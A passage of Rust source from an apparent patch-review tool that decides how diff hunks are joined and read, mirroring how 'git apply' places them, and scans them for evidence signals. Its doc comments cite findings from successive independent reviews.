            line.and_then(|line| Language::of(path, Some(line.text.as_str())))
        };
        let hunks = &file.patch_twin.hunks;
        let released = hunks
            .first()
            .filter(|hunk| hunk.new_start == Some(1))
            .and_then(|hunk| {
                shebang(
                    hunk.lines
                        .iter()
                        .find(|line| line.kind != PatchLineKind::Removed),
                )
            });
        let mut languages = vec![released];
        for hunk in hunks {
            for other in [PatchLineKind::Removed, PatchLineKind::Added] {
                let named = shebang(hunk.lines.iter().find(|line| line.kind != other));
                if named.is_some() && !languages.contains(&named) {
                    languages.push(named);
                }
            }
        }
        languages
            .into_iter()
            .map(|language| Self::with(path, language))
            .collect()
    }

    /// The kind of a file at `path` read as `language`.
    fn with(path: &str, language: Option<Language>) -> Self {
        let name = path.rsplit('/').next().unwrap_or(path);
        // One extension table: the lexical layer's.
        let yaml = Language::of(path, None) == Some(Language::Yaml);
        let generated = crate::risk::is_generated_or_vendored(path);
        Self {
            language,
            ci_workflow: ((path.starts_with(".github/workflows/")
                || path.contains("/.github/workflows/"))
                && yaml)
                || name == ".gitlab-ci.yml",
            // These two are path-scoped (the file's role, not its tokens), so like every path
            // signal they do not apply under a generated or vendored path. Token rules do.
            build_script: (name == "build.rs" || name == "setup.py") && !generated,
            package_json: name == "package.json" && !generated,
        }
    }

    /// The rules of release 0.8.3 that this file admits, if it is a Rust file
    /// ([`LEGACY_RUST_RULES`]; picked once for a file, not once for each of its hunks).
    fn legacy_rules(&self) -> Vec<&'static Rule> {
        LEGACY_RUST_RULES
            .iter()
            .filter(|rule| self.language == Some(Language::Rust) && self.admits(rule.scope))
            .collect()
    }

    fn admits(&self, scope: Scope) -> bool {
        match scope {
            Scope::Any => true,
            Scope::Languages(languages) => self.language.is_some_and(|l| languages.contains(&l)),
            Scope::CiWorkflow => self.ci_workflow,
            Scope::BuildScript => self.build_script,
            Scope::PackageJson => self.package_json,
        }
    }
}

/// Every piece of evidence in `file`, in hunk order, then line order, then rule order, with no
/// duplicates and no cap (callers cap what they print with [`MAX_EVIDENCE_PER_FILE`]). The
/// items release 0.8.3 reported are marked ([`Evidence::released`]) and stand in this list in
/// the order that release gave them: it went by hunk, then line, then signal, as this does,
/// and the signals it had come first in [`EvidenceSignal::ALL`], in its order.
///
/// The answer for a hunk comes from the texts it stands in (`joined_texts`): that hunk, and the
/// hunks of its file that no unseen line parts it from. There is no budget shared by the
/// hunks of a file or the files of a review for these, so their answer does not depend on what
/// else the review holds or on the order it is read in. (While a parser read the hunks, a
/// review had a plan that said which hunks it might read, and every caller had to pass it.)
///
/// Each hunk is also read as release 0.8.4 reads it ([`HunkLabels`]), and what that reading
/// finds is united with the rest. That reading carries what a hunk of a file the patch creates
/// leaves open into the next within a bound shared by the files of a patch
/// ([`CarriedShares`]): `file` is read here as the only file of its patch, with the whole of
/// it. [`crate::rank`] reads each file of a patch with its share of it.
#[must_use]
pub fn file_evidence(file: &ReviewFile) -> Vec<Evidence> {
    file_evidence_marked(file, Share::Own).0
}

/// Not part of the API, and may change (the fuzz crate uses it). For each item of
/// [`file_evidence`], in its order: whether the reading every release up to 0.8.3 had finds
/// it ([`Evidence::released`]). A ranked file's bounded list holds those items first
/// ([`crate::RankedFile`]), so it never lists fewer of them than 0.8.3 listed; the
/// `evidence_scan` fuzz target holds that with this. `file` is read as the only file of its
/// patch, as by [`file_evidence`].
#[doc(hidden)]
#[must_use]
pub fn file_evidence_released(file: &ReviewFile) -> Vec<bool> {
    file_evidence_marked(file, Share::Own).1
}

/// [`file_evidence`], and beside it, item for item, whether the item is a released finding
/// ([`Evidence::released`]); with the hunks the reading of release 0.8.4 reads together that
/// `share` says.
pub(crate) fn file_evidence_marked(file: &ReviewFile, share: Share) -> (Vec<Evidence>, Vec<bool>) {
    let hunks = &file.patch_twin.hunks;
    let mut out: Vec<Evidence> = Vec::new();
    for (hunk, hits) in hunks.iter().zip(hunk_hits(file, share)) {
        let mut address = None;
        // Each (side, signal, line) is in `hits` once and items of different hunks differ in
        // `hunk`, so there is nothing to deduplicate: a scan of `out` per item made a patch of
        // 160k matching lines take 4.8 s.
        for hit in hits {
            let address = address
                .get_or_insert_with(|| hunk.address(&file.path))
                .clone();
            out.push(Evidence {
                signal: hit.signal,
                basis: hit.basis,
                hunk: hunk.id,
                address,
                side: hit.side,
                line: hit.number,
                test_likely: hit.signal == S::PanicPathAdded && hit.side == Side::New && hit.likely,
                released: hit.released,
            });
        }
    }
    let marks = out.iter().map(|item| item.released).collect();
    (out, marks)
}

/// What every reading finds in each hunk of `file`, read with `share`: the readings of the
/// integrity signals, the reading of release 0.8.4, and, for a section of a path that the
/// patch writes in several sections Git applies in order, what the reading of those sections
/// as one file finds in its hunks ([`CarriedShares`]).
fn hunk_hits(file: &ReviewFile, share: Share) -> Vec<Vec<Hit>> {
    let mut released = HunkLabels::sharing(file, share);
    let joined = match share {
        Share::Of(_, joined) => joined,
        Share::Own => &[],
    };
    let found = file_found(file, &joined_texts(file), None);
    let hunks = &file.patch_twin.hunks;
    let mut all = Vec::with_capacity(hunks.len());
    for (index, (hunk, hits)) in hunks.iter().zip(&found).enumerate() {
        let hits = unite(hits, &hits_of_items(hunk, &released.matches(index)));
        all.push(match joined.get(index) {
            Some(more) => unite(&hits, more),
            None => hits,
        });
    }
    all
}

/// The items the reading of release 0.8.4 found in `hunk` (`items`, in the order of its lines)
/// as hits, each at the place of its line in the hunk, so that [`unite`] takes them with the
/// hits of the other readings. An item the reading of 0.8.3 finds keeps its mark.
fn hits_of_items(hunk: &PatchHunk, items: &[Item]) -> Vec<Hit> {
    let mut lines = hunk.lines.iter().enumerate();
    let mut at_line: Option<(usize, Side, u32)> = None;
    let mut hits = Vec::with_capacity(items.len());
    for &(side, signal, number, released) in items {
        // The items are in the order of the lines, each line's together: go on to its line.
        while at_line.is_none_or(|(_, s, n)| (s, n) != (side, number)) {
            let Some((at, line)) = lines.next() else {
                return hits;
            };
            at_line = match line.kind {
                PatchLineKind::Added => line.new_line.map(|n| (at, Side::New, n)),
                PatchLineKind::Removed => line.old_line.map(|n| (at, Side::Old, n)),
                PatchLineKind::Context => None,
            };
        }
        if let Some((at, _, _)) = at_line {
            hits.push(Hit {
                at,
                side,
                signal,
                number,
                basis: Basis::Lexical,
                likely: false,
                from_code: false,
                released,
            });
        }
    }
    hits
}

/// The signals in `one` or in `other`, in [`EvidenceSignal::ALL`] order.
fn either(one: &[EvidenceSignal], other: &[EvidenceSignal]) -> Vec<EvidenceSignal> {
    EvidenceSignal::ALL
        .into_iter()
        .filter(|signal| one.contains(signal) || other.contains(signal))
        .collect()
}

/// The distinct signals in hunk `index` of `file`, in [`EvidenceSignal::ALL`] order: the labels
/// the outline and hunk views show; `None` if the file has no such hunk. The same scan as
/// [`file_evidence`], of the texts this hunk stands in and no others, so a view never
/// disagrees with the rank. What it costs: a pass over the file's hunk headers to find those
/// texts, and one reading of each (the hunk alone, and each run it is in, whole: what stands
/// before the hunk in a run decides how it starts, and what stands after it can complete a
/// construct it begins and decides which starts the run is read from). So for a hunk of a
/// long run this is the cost of that run, not of the hunk; it is not the cost of the file,
/// since no other hunk is read alone. A caller that shows many hunks of one file asks
/// [`joined_hunks`] once, then [`hunk_signals_alone`] for each hunk that is not in it, and
/// scans the file once for the others.
///
/// The reading of release 0.8.4 ([`HunkLabels::new`]) is asked for this hunk too: for a hunk of
/// a file the patch creates in several hunks it goes through the hunks before it, as far as
/// the bound, and for any other hunk it reads the hunk alone.
///
/// The hunk is named by its place in the file. (Until 2026-11-15 it was passed by reference
/// and looked for by its address in memory: a copy of the hunk was not found, and was then
/// read alone with no word of it. Seventh independent review, IR7-L-4.)
#[must_use]
pub fn hunk_signals(file: &ReviewFile, index: usize) -> Option<Vec<EvidenceSignal>> {
    hunk_signals_with(file, index, HunkLabels::new(file))
}

/// Not part of the API, and may change: [`hunk_signals`] of `file` read with its share of its
/// patch's carried reading ([`HunkLabels::in_patch`]), `file` being the file at `at` of the
/// files `shares` was made from, as a view of the patch asks for one hunk.
#[doc(hidden)]
#[must_use]
pub fn hunk_signals_in_patch(
    file: &ReviewFile,
    index: usize,
    shares: &CarriedShares,
    at: usize,
) -> Option<Vec<EvidenceSignal>> {
    let signals = hunk_signals_with(file, index, HunkLabels::in_patch(file, shares, at, &[]))?;
    Some(either(&signals, &shares.joined_signals(at, index)))
}

/// [`hunk_signals`], with the reading of release 0.8.4 asked of `released`.
fn hunk_signals_with(
    file: &ReviewFile,
    index: usize,
    mut released: HunkLabels,
) -> Option<Vec<EvidenceSignal>> {
    file.patch_twin.hunks.get(index)?;
    let with: Vec<Text> = joined_texts(file)
        .into_iter()
        .filter(|text| text.hunks.contains(&index))
        .collect();
    let found = file_found(file, &with, Some(index));
    Some(either(&signals_of(&found[index]), &released.of(index)))
}

/// [`hunk_signals`] for a hunk that is a text of its own ([`joined_hunks`] does not name it):
/// the scan of that hunk alone, at the cost of that hunk and of nothing else. `None` if the
/// file has no hunk `index`. The reading of release 0.8.4 is asked of the hunk alone, which is
/// how it reads every hunk but those of a file the patch creates in several hunks
/// ([`HunkLabels::read_together`]): a caller asks [`hunk_signals`], or the file's evidence,
/// for those.
///
/// `kinds` are the kinds of this file, [`FileKinds::of`]`(file)`, which the caller works out
/// once for the file and passes for each of its hunks. (Round 15 worked them out here, and
/// for a file whose name gives no language that is a pass over every hunk of the file: a
/// view of the hunks of such a file by path cost the square of their number. Eighth
/// independent review, IR8-M-2.)
#[must_use]
pub fn hunk_signals_alone(
    file: &ReviewFile,
    index: usize,
    kinds: &FileKinds,
) -> Option<Vec<EvidenceSignal>> {
    let hunk = file.patch_twin.hunks.get(index)?;
    let lines: Vec<&PatchLine> = hunk.lines.iter().collect();
    let top = placed_at_top(file.status, hunk, index == 0);
    let mut found = Vec::new();
    for (kind, rules) in &kinds.0 {
        found = unite(&found, &text_hits(&lines, top, kind.language, rules));
        if kind.language == Some(Language::Rust) {
            found = unite(&found, &released_hits(hunk, &kind.legacy_rules()));
        }
    }
    // Release 0.8.4 read the file as the first kind, which is the kind of its own rule.
    let released = kinds.0.first().map_or_else(Vec::new, |(kind, _)| {
        let rules: Vec<&Rule> = RELEASED_RULES
            .iter()
            .filter(|rule| kind.admits(rule.scope))
            .collect();
        distinct(&hunk_matches(hunk, kind.language, &rules))
    });
    Some(either(&signals_of(&found), &released))
}

/// For each hunk of `file`, by its place: whether it is read together with another hunk of
/// the file (`joined_texts`). For such a hunk the evidence of the hunk alone is not the
/// evidence the file's scan gives it. (One flag a hunk: until 2026-11-15 this was the list of
/// their ids, which a caller kept as a set, and for a file of half a million joined hunks
/// that set was a tenth of the memory of a view.)
#[must_use]
pub fn joined_hunks(file: &ReviewFile) -> Vec<bool> {
    let mut joined = vec![false; file.patch_twin.hunks.len()];
    for text in &joined_texts(file) {
        for index in &text.hunks {
            joined[*index] = true;
        }
    }
    joined
}

/// The distinct signals of `hits`, in [`EvidenceSignal::ALL`] order.
fn signals_of(hits: &[Hit]) -> Vec<EvidenceSignal> {
    EvidenceSignal::ALL
        .into_iter()
        .filter(|signal| hits.iter().any(|hit| hit.signal == *signal))
        .collect()
}

/// Whether `hunk` is at the beginning of its file however the patch is applied, `first` saying
/// that it is the first hunk of its section. In a section that creates a file the first hunk
/// is, whatever its header says (the file is empty until that hunk is applied); the reader
/// takes no other hunk of such a section for the top, and joins them in the order written.
/// In any other section a hunk is when its OLD position is 0, or is 1 and the hunk holds an
/// old line: that is the one thing plain `git apply` reads the old position for.
///
/// One applier puts another hunk of a created file at the top all the same: plain
/// `git apply` refuses a created file with two hunks at `-0,0`, and `git apply
/// --unidiff-zero` applies it and puts the later hunk at line 1, ABOVE the earlier one, as for
/// an existing file (tenth independent review, IR10-L-1: `newtwotop.patch`, `()` written
/// first and `opt.unwrap` second, gives a file that holds the call, and nothing reports it;
/// `newtop-natural.patch`, the two the other way round, gives a file with no call, and the
/// join in the order written reports one). Both are declared with the hunks at old position 0
/// of an existing file, below: a writer's.
///
/// Nothing else in a header says where a hunk goes. Git looks for the hunk's old lines,
/// starting at the NEW position and going outward, and puts the hunk at the nearest place
/// that has them. So a hunk this function does not call the top can be at the top all the
/// same (`@@ -9,4 +1,5 @@` goes to line 1 of a file whose first four lines are its old
/// lines, with no message), and no number says that it is not. A fragment is therefore read
/// so that it loses nothing the top reading has: from code like the top; from the top of a
/// file too when its first line is a shebang; and the language of a file with no extension
/// comes from a shebang on the first line of any hunk ([`FileKind::readings`]).
///
/// A hunk of added lines only with old position 1 (`@@ -1,0 +2,3 @@`) is not the top. Plain
/// `git apply` refuses it on a file that has lines; `git apply --unidiff-zero`, which is how a
/// `git diff -U0` patch is applied, puts it AFTER line 1.
///
/// A section can have several hunks that this function calls the top (two at old position
/// 0; one at 0 and one at 1 that holds an old line). Plain `git apply` refuses such a patch
/// on a file that has lines. `git apply --unidiff-zero` applies it: every hunk at old
/// position 0 goes to line 1, the one written later above the one written earlier, and a
/// hunk at old position 1 under them. Each is read here as the top and joined to nothing,
/// so a construct cut by two of them is not found, and a second one that stands under a
/// comment the first leaves open is read from code. That is declared, not read (ninth
/// independent review, IR9-M-1; a test pins it, with the Git runs), and so is the same stack
/// in a created file (IR10-L-1, above).
///
/// Until 2026-11-14 a side counted as the top of its file when its own first line had the
/// number 1, and for the new side that number is the `+N` of the header, which is the patch
/// writer's word: `@@ -9,4 +1,5 @@` is applied at line 9 when its old lines are there and
/// not at line 1 (sixth independent review, IR6-H-1). Round 14 wrote in this place that Git
/// looks near the OLD position and never uses the new one. It is the other way round
/// (seventh independent review, IR7-L-3, and the runs in the test
/// `the_top_of_a_file_is_where_git_must_put_the_hunk`); the rule was right and stays.
fn placed_at_top(status: FileStatus, hunk: &PatchHunk, first: bool) -> bool {
    if status == FileStatus::Added {
        // The file is empty until its first hunk is applied, and never again.
        return first;
    }
    match hunk.old_start {
        Some(0) => true,
        Some(1) => hunk
            .lines
            .iter()
            .any(|line| line.kind != PatchLineKind::Added),
        _ => false,
    }
}

/// One text of a file: one hunk, or hunks that no unseen line parts, in the order the file
/// has them.
#[derive(Debug, PartialEq, Eq)]
struct Text {
    /// The indices of its hunks in the file's list.
    hunks: Vec<usize>,
    /// Its first hunk is at the beginning of the file ([`placed_at_top`]).
    top: bool,
}

/// The texts of `file`: every way its hunks are read. Each hunk alone, and then the joined
/// texts ([`joined_texts`]). (For the tests that say what the texts of a file are; the scan
/// holds no entry for a hunk alone.)
#[cfg(test)]
fn texts(file: &ReviewFile) -> Vec<Text> {
    (0..file.patch_twin.hunks.len())
        .map(|index| Text {
            hunks: vec![index],
            top: placed_at_top(file.status, &file.patch_twin.hunks[index], index == 0),
        })
        .chain(joined_texts(file))
        .collect()
}

/// The texts of `file` that are more than one hunk: the further ways its hunks are read.
///
/// **Every hunk is a text of its own, always.** That is the reading of a hunk with unseen
/// lines before and after it: the reading every version before round 14 made, and the right
/// one wherever the hunks do not in fact stand together. No join takes it away. It needs no
/// entry here: [`texts_found`] reads each hunk alone as it goes, and a file of half a million
/// hunks does not hold half a million texts of one hunk for it (they took a fifth of the
/// memory of a scan of such a file).
///
/// **A join is a further reading.** Where plain `git apply` must put two hunks one straight
/// after the other, or their positions say it does, they are ALSO read as one text, as if
/// they were one hunk: the state of the lexer and the window of the reader of tokens run
/// across the join. Each item is still reported with the hunk and the line it stands in, and
/// what the readings find is united.
///
/// What plain `git apply` 2.56.0 does with a hunk (run in scratch repositories; the runs are
/// in the tests `the_top_of_a_file_is_where_git_must_put_the_hunk` and
/// `hunks_git_must_put_together_are_one_text`): it looks for the hunk's old lines, starting
/// at the hunk's NEW position and going outward, and puts the hunk at the nearest place that
/// has them. The old position is read for one thing only: 0, or 1, says the hunk must be at
/// the beginning. A hunk whose last line is not a context line must match at the END of the
/// file. So the text decides, and the numbers are where to look first.
///
/// - *Joins Git must make.* A hunk with no old line at all (only added lines) has nothing to
///   match but the end of the file. So such a hunk stands straight after the last earlier
///   hunk of its section that ended the file, whatever the numbers in its header say
///   (`@@ -50,0 +90,1 @@` after `@@ -0,0 +1,2 @@` is line 3). A section that creates a file
///   is therefore one text from line 1, however many hunks it is written as; so is a run of
///   such hunks at the end of an existing file, which is also what a `git diff -U0` patch of
///   added lines is to plain `git apply` (it needs `--unidiff-zero` to go where it was cut
///   from, and there each of its hunks is a fragment: the reading of every hunk alone).
/// - *Joins on a hint.* Anywhere else two hunks may touch (the second begins on the line
///   after the last line of the first) and the patch cannot prove it. Its numbers say so
///   when they are honest, and Git obeys neither number of a hunk whose old position is 2
///   or more. Both are taken as hints: hunks are read as one text when their OLD positions
///   say that one follows the other, and when their NEW positions say so, in whatever order
///   the patch has them. A hunk with no line on a side says the line it stands after, as a
///   later hunk and as an earlier one (`@@ -2,0 +3,1 @@` and then `@@ -3,1 +4,1 @@`: plain
///   Git refuses the pair and `git apply --unidiff-zero` puts them together. Round 14
///   joined that pair only when it was written the other way round: seventh independent
///   review, IR7-M-2).
///
///   The hints are taken twice. Once for plain `git apply`: the joins Git must make stand,
///   and a number adds to them where it does not contradict them. And once for an applier
///   that goes by the numbers alone (`git apply --unidiff-zero` puts a hunk with no old line
///   at its new position and not at the end of the file; at line 1, when its old position
///   is 0, which no join models: see below): there the numbers join whatever
///   they name, nothing has to be at the end, and a hunk with no line on a side stands
///   between the hunk that ends before its place and the hunk that begins there. And round
///   14's own joins (old numbers, hunks with old lines only, the first that ends before a
///   position) are made by its own rule beside these, so that no later hint takes one of
///   them away ([`hinted_joins`]).
///
/// **The bound.** A hunk stands in at most seven texts: alone; in the run Git must make; in
/// the run round 14's rule makes; and in one run for each of the two numbers under each of
/// the two ways of taking them. A run that two of these make is read once, so a patch whose
/// numbers are true and whose hunks have context is read alone and, where hunks touch, once
/// more. Within each kind of run a hunk has at most one hunk before it and one after it. So
/// a file costs at most seven readings of itself, however many hunks it has.
///
/// What this does not see, each of which takes a writer who sets out to:
///
/// - two hunks that touch while neither position of the second says so. A construct cut in
///   two by such a pair is read in two halves, and a hunk side is read as text that ends
///   there (`rust_tokens`): the construct is found only where one half holds it whole;
/// - two hunks that touch by a number, when another hunk that has lines on that side says
///   falsely that it ends before the same line and is written first, or says falsely that
///   it begins at that line and is written between the two ([`hinted_joins`]). A hunk with
///   no line on the side cannot do that (until round 16 it could);
/// - two or more hunks that are each the top of the file ([`placed_at_top`]), which
///   `git apply --unidiff-zero` stacks at line 1, and a created file written as several
///   hunks at old position 0, which it stacks the same way while the reader joins them in
///   the order written (IR10-L-1);
/// - a hunk that an applier puts INSIDE the lines another hunk showed. A hunk's lines are
///   read as lines that stand together. `git apply --unidiff-zero` puts a hunk of added
///   lines at its new number (at line 1, if its old position is 0), and that can be between
///   two lines of an earlier hunk
///   (`@@ -1,3 +1,4 @@` with `let v = opt.unwrap` as its third line, then `@@ -3,0 +4,1 @@`
///   with `();`: line 4 stands before the first hunk's last line, and the result holds the
///   call). Plain Git puts that second hunk at the end of the file. No reading here puts a
///   hunk between the lines of another (eighth independent review, IR8-M-4).
///
/// A `git diff` with context lines writes neither touching hunks nor a file's creation in
/// several hunks, so for such a patch every hunk is read alone and no other way; a
/// `git diff -U0` writes hunks of added lines only, and those are joined as above.
///
/// Until 2026-11-14 every hunk was read alone only, and a file created as two hunks hid a
/// call whose name ended the first and whose `()` began the second (sixth independent
/// review, IR6-H-3). Round 14 said in this place that Git places a hunk "by looking for its
/// old lines near the old position" and joined on old positions only; Git starts at the new
/// position (seventh independent review, IR7-L-3).
fn joined_texts(file: &ReviewFile) -> Vec<Text> {
    walked();
    let hunks = &file.patch_twin.hunks;
    let count = |index: usize, other: PatchLineKind| {
        hunks[index]
            .lines
            .iter()
            .filter(|line| line.kind != other)
            .count() as u64
    };
    let old_lines: Vec<u64> = (0..hunks.len())
        .map(|index| count(index, PatchLineKind::Added))
        .collect();
    let new_lines: Vec<u64> = (0..hunks.len())
        .map(|index| count(index, PatchLineKind::Removed))
        .collect();
    let top: Vec<bool> = hunks
        .iter()
        .enumerate()
        .map(|(index, hunk)| placed_at_top(file.status, hunk, index == 0))
        .collect();
    // The hunk each hunk must follow, and the hunks that have one that must follow them.
    let mut must_before: Vec<Option<usize>> = vec![None; hunks.len()];
    let mut must_followed = vec![false; hunks.len()];
    // The last hunk so far that must end the file.
    let mut ends_file: Option<usize> = None;
    for (index, hunk) in hunks.iter().enumerate() {
        if old_lines[index] == 0
            && !top[index]
            && let Some(earlier) = ends_file
        {
            must_before[index] = Some(earlier);
            must_followed[earlier] = true;
        }
        if hunk
            .lines
            .last()
            .is_none_or(|line| line.kind != PatchLineKind::Context)
        {
            ends_file = Some(index);
        }
    }
    // The runs of a kind of join: `before` names the hunk each hunk follows.
    let runs = |before: &[Option<usize>]| -> Vec<Vec<usize>> {
        let mut after: Vec<Option<usize>> = vec![None; hunks.len()];
        for (index, earlier) in before.iter().enumerate() {
            if let Some(earlier) = earlier {
                after[*earlier] = Some(index);
            }
        }
        (0..hunks.len())
            .filter(|index| before[*index].is_none())
            .map(|start| std::iter::successors(Some(start), |index| after[*index]).collect())
            .filter(|run: &Vec<usize>| run.len() > 1)
            .collect()
    };
    // The runs Git must make; the runs each side's numbers add to them; the runs each side's
    // numbers make by themselves. A run two of them make is read once.
    let mut joined = runs(&must_before);
    // The runs so far that begin with each hunk (six at most), so that a run made again is
    // found without a search of all of them: a patch can be all pairs.
    let mut begun: std::collections::HashMap<usize, Vec<usize>> = joined
        .iter()
        .enumerate()
        .map(|(place, run)| (run[0], vec![place]))
        .collect();
    let old_side: Vec<(Option<u32>, u64)> = hunks
        .iter()
        .zip(&old_lines)
        .map(|(hunk, lines)| (hunk.old_start, *lines))
        .collect();
    let new_side: Vec<(Option<u32>, u64)> = hunks
        .iter()
        .zip(&new_lines)
        .map(|(hunk, lines)| (hunk.new_start, *lines))
        .collect();
    let must = Some((must_before.as_slice(), must_followed.as_slice()));
    // Round 14's joins first, by its own rule and untouched by any later one; then the hints
    // of each number: beside the joins Git must make, as plain Git places hunks, and alone,
    // as the numbers order them.
    for before in [
        hinted_joins(&old_side, &top, must, Hints::Lined),
        hinted_joins(&old_side, &top, must, Hints::LinesFirst),
        hinted_joins(&new_side, &top, must, Hints::LinesFirst),
        hinted_joins(&old_side, &top, None, Hints::Positions),
        hinted_joins(&new_side, &top, None, Hints::Positions),
    ]
    .into_iter()
    .flatten()
    {
        for run in runs(&before) {
            let same_start = begun.entry(run[0]).or_default();
            if !same_start.iter().any(|place| joined[*place] == run) {
                same_start.push(joined.len());
                joined.push(run);
            }
        }
    }
    joined
        .into_iter()
        .map(|hunks| Text {
            top: top[hunks[0]],
            hunks,
        })
        .collect()
}

/// Which hunks may stand before a position and which hunks choose first, for
/// [`hinted_joins`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Hints {
    /// Round 14's rule, kept as it was: the first hunk of the patch that has lines on the side
    /// and ends before the position, and no other; the hunks choose in the order of the
    /// patch. Whatever a later rule joins, the joins this one makes are made, and read as
    /// they were.
    Lined,
    /// For plain `git apply`, which puts a hunk with no old line at the end of the file and
    /// not between two others: the hunks that have lines on the side choose first, and take
    /// a hunk that has lines there before one that has none. So a hunk with no line on a
    /// side takes no place on that side, as the one before or as the one after, that a hunk
    /// with lines there asks for.
    LinesFirst,
    /// For an applier that goes by the numbers: the hunks stand in the order of their
    /// positions, a hunk with no line on the side between the hunk that ends before its
    /// place and the hunk that begins there. The hunks with no line on the side choose
    /// first (the hunk with lines that ends before their place, else the last free hunk of
    /// their kind written before them), and a hunk with lines then goes after the last of
    /// them.
    Positions,
}

/// The hunk each hunk follows by the positions of one side, if those positions join any:
/// `side` has, for each hunk, the start its header gives on that side and how many lines it
/// has there. A hunk with lines on the side says its first line and, with its count, the line
/// after its last; a hunk with none says the line it stands after. A hunk that is the `top`
/// of its file follows nothing.
///
/// `must`: for plain `git apply`, the hunk each hunk must follow and the hunks that have one
/// that must follow them. Those joins stand, and a number only adds to them. Without it the
/// numbers are taken alone, as an applier takes them for which nothing has to be at the end
/// of the file.
///
/// `hints` says which hunks can be the one before and who chooses first ([`Hints`]). For a
/// position the candidates are the hunks that say they end before it, those with lines on
/// the side first and each kind in the order of the patch, and of them the first is taken
/// that nothing follows yet, that is not the hunk itself and that is not the end of the run
/// the hunk begins. Of two hunks with no line on the side that name one position, the one
/// written first stands first: their numbers say nothing of it.
///
/// **A hint that a later round added never takes away a join an earlier rule made.** Round 15
/// let a hunk with no line on the side stand for the position it names, kept ONE hunk for
/// each position, the first of the patch, and went through the hunks once. So a hunk of
/// added lines written early took the place of the hunk that truly ended there, and two
/// hunks that round 14 joined were read apart (eighth independent review, IR8-M-1:
/// `decoy2.patch`, a trivial assertion that round 14 reported and round 15 did not, and
/// reported again when a number Git never reads was changed; a hunk could also find itself
/// in that place and give up). Now round 14's joins are made by round 14's rule
/// ([`Hints::Lined`]), and beside them the hints of each number are taken in the two ways
/// above: for plain Git a hunk with lines is joined to a hunk with lines whatever hunks
/// with none name the place, and by the numbers alone the hunks with none stand between
/// them.
///
/// What stays: among several hunks that all have lines on the side and all say they end
/// before one position, the first of the patch is taken by the first hunk of the patch that
/// has lines and says it begins there, the second by the second. A number that is false in
/// that way, in a hunk that has lines on that side, is the declared way to part two hunks:
/// a third hunk that says it ends before the line where two touch, written before them, or
/// one that says it begins there, written between them (ninth independent review, IR9-L-4).
/// Written after both, such a hunk takes nothing.
fn hinted_joins(
    side: &[(Option<u32>, u64)],
    top: &[bool],
    must: Option<(&[Option<usize>], &[bool])>,
    hints: Hints,
) -> Option<Vec<Option<usize>>> {
    // The hunks that can stand before a position, by position; for one position those with
    // lines on the side first, each kind in the order of the patch.
    let mut ends: Vec<(u64, bool, usize)> = side
        .iter()
        .enumerate()
        .filter_map(|(index, (start, lines))| {
            let start = (*start)?;
            (hints != Hints::Lined || *lines > 0)
                .then(|| (u64::from(start) + (*lines).max(1), *lines == 0, index))
        })
        .collect();
    ends.sort_unstable();
    let (mut before, mut followed) = match must {
        Some((before, followed)) => (before.to_vec(), followed.to_vec()),
        None => (vec![None; side.len()], vec![false; side.len()]),
    };
    // The run each hunk is in so far, by its first hunk: a hint that would close a ring (a
    // hunk that Git must put after another, named by its number as standing before it) is
    // not taken.
    let mut first: Vec<usize> = (0..side.len()).collect();
    let head = |first: &mut Vec<usize>, mut index: usize| {
        while first[index] != index {
            first[index] = first[first[index]];
            index = first[index];
        }
        index
    };
    for index in 0..side.len() {
        if let Some(earlier) = before[index] {
            first[index] = head(&mut first, earlier);
        }
    }
    // For each place of `ends`, the next place at or after it whose hunk nothing follows yet
    // (the place after the last, when there is none): a patch can name one position in every
    // hunk, and each hunk is passed over once.
    let mut free: Vec<usize> = (0..=ends.len()).collect();
    let next_free = |free: &mut Vec<usize>, mut place: usize| {
        while free[place] != place {
            free[place] = free[free[place]];
            place = free[place];
        }
        place
    };
    for (place, (_, _, index)) in ends.iter().enumerate() {
        if followed[*index] {
            free[place] = place + 1;
        }
    }
    let mut hinted = false;
    // which hunks choose first: `Some(true)` is a turn of those with no line on the side
    let passes: &[Option<bool>] = match hints {
        Hints::Lined => &[None],
        Hints::LinesFirst => &[Some(false), Some(true)],
        Hints::Positions => &[Some(true), Some(false)],
    };
    let turns = passes.iter().flat_map(|pass| {
        side.iter()
            .enumerate()
            .filter(move |(_, (_, lines))| pass.is_none_or(|none| (*lines == 0) == none))
    });
    for (index, (start, lines)) in turns {
        if before[index].is_some() || top[index] {
            continue;
        }
        let Some(start) = start else {
            continue;
        };
        let position = u64::from(*start) + u64::from(*lines == 0);
        let from = ends.partition_point(|(key, _, _)| *key < position);
        let mut place = if hints == Hints::Lined {
            from
        } else {
            next_free(&mut free, from)
        };
        while let Some(&(key, bare, earlier)) = ends.get(place) {
            // Two hunks with no line on the side that name one position say nothing of
            // which stands first there: the order of the patch is the one order they have
            // (and those written later come later in `ends`).
            if key != position || (bare && *lines == 0 && earlier >= index) {
                break;
            }
            if !followed[earlier] && earlier != index && head(&mut first, earlier) != index {
                before[index] = Some(earlier);
                followed[earlier] = true;
                free[place] = place + 1;
                first[index] = head(&mut first, earlier);
                hinted = true;
                break;
            }
            if hints == Hints::Lined {
                break;
            }
            // itself, or the end of the run it begins: neither can be before it
            place = next_free(&mut free, place + 1);
        }
    }
    hinted.then_some(before)
}

/// What the rules find in each hunk of `file` (in the one hunk `only`, when it names one),
/// read alone and in the texts `joined`, under every kind the file is read as
/// ([`FileKind::readings`]): for each hunk, in line order and then the order of
/// [`EvidenceSignal::ALL`], an item once however many kinds, texts and readings find it.
fn file_found(file: &ReviewFile, joined: &[Text], only: Option<usize>) -> Vec<Vec<Hit>> {
    let mut found: Vec<Vec<Hit>> = Vec::new();
    for (place, kind) in FileKind::readings(file).iter().enumerate() {
        let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
        let of_kind = texts_found(file, joined, kind, &rules, only, place == 0);
        if place == 0 {
            // nearly every file is read as one kind: its table is the answer
            found = of_kind;
            continue;
        }
        for (all, own) in found.iter_mut().zip(of_kind) {
            *all = if all.is_empty() {
                own
            } else {
                unite(all, &own)
            };
        }
    }
    found
}

/// What the rules find in each hunk of `file` (in the one hunk `only`, when it names one) under
/// one kind: in the hunk read alone, in each text of `joined` it stands in and, for Rust, in
/// the reading of release 0.8.3 ([`released_hits`]). For each hunk, in line order and then the
/// order of [`EvidenceSignal::ALL`], an item once however many texts and readings find it,
/// marked `released` when release 0.8.3 reported it (`release`: `kind` is the kind that
/// release read the file as, the first of [`FileKind::readings`]; under any other kind
/// nothing is that release's).
///
/// Every hunk is read alone here, in file order, with nothing kept for it but what it gives:
/// no join takes that reading away, and no list of such texts is held.
fn texts_found(
    file: &ReviewFile,
    joined: &[Text],
    kind: &FileKind,
